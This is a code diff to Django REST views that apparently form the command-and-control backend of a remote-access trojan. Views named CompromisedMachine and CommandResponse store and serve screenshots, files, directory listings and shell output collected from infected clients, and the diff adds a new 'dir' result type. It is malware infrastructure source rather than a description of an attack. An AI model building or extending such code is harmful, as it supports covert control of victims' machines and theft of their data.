@@ -11,7 +11,8 @@ from django.contrib.auth import login
 from .serializers import LoginSerializer
 from rest_framework.permissions import IsAuthenticated
 from rest_framework.authentication import TokenAuthentication
-
+import json
+import re
 # Create your views here.
 
 ANTIVIRUS_PROCESSES = {
@@ -181,7 +182,7 @@ class CompromisedMachine(APIView):
     def save_response(self, data):
         commandid = data.get('id', None)
         response = data.get('response', None)
-        type = data.get('type_', None)
+        type_ = data.get('type_', None)
         try:
             clientid = Command.objects.get(id= commandid).client
             client = Client.objects.get(id= clientid)
@@ -190,15 +191,17 @@ class CompromisedMachine(APIView):
             
             target_dir = os.path.join(root_dir, f"ClientsData/{client.id}")
             extension  = "txt"
-            if type == "screenshot":
+            if type_ == "screenshot":
                 target_dir = os.path.join(target_dir, "screenshots")
                 extension = "txt"  # as base 64
-            elif type == "file":
+            elif type_ == "file":
                 target_dir = os.path.join(target_dir, "files")
-            elif type == "list":
+            elif type_ == "list":
                 target_dir = os.path.join(target_dir, "list")
-            elif type == "shell":
+            elif type_ == "shell":
                 target_dir = os.path.join(target_dir, "shell")
+            elif type_ == "dir":
+                target_dir = os.path.join(target_dir, "dir")
 
             if not os.path.exists(target_dir):
                 os.makedirs(target_dir)
@@ -265,17 +268,24 @@ class CommandResponse(APIView):
                 target_dir = os.path.join(target_dir, "list")
             elif command.command.startswith("shell"):
                 target_dir = os.path.join(target_dir, "shell")
+            elif command.command.startswith("dir"):
+                target_dir = os.path.join(target_dir, "dir")
 
             file_path = os.path.join(target_dir, f"{command.id}.{extension}")
+           
             with open(file_path, "r", encoding="utf-8") as file:
-                data = file.read()
+                
+                if  command.command.startswith("dir"):
+                    data = json.loads(file.read())
+                else:
+                    data = file.read()
 
-            return Response({'data':data, 'title':id+ " : " +command.result, 'command':command.command}, status=200)
+            return Response({'data':data, 'title':id+ " : " +command.result, 'command':command.command,'result':command.result}, status=200)
 
         except Exception as ex:
-            return Response({'data':f'No Data Found' , 'title':id+ " : " +command.result}, status=404)
-        
-
+            print(ex)
+            return Response({'data':f'No Data Found' , 'title':id+ " : " +command.result,  'result':command.result}, status=404)
+   
 class LoginView(APIView):
     serilizer_class = LoginSerializer
     permission_classes  = ([AllowAny])
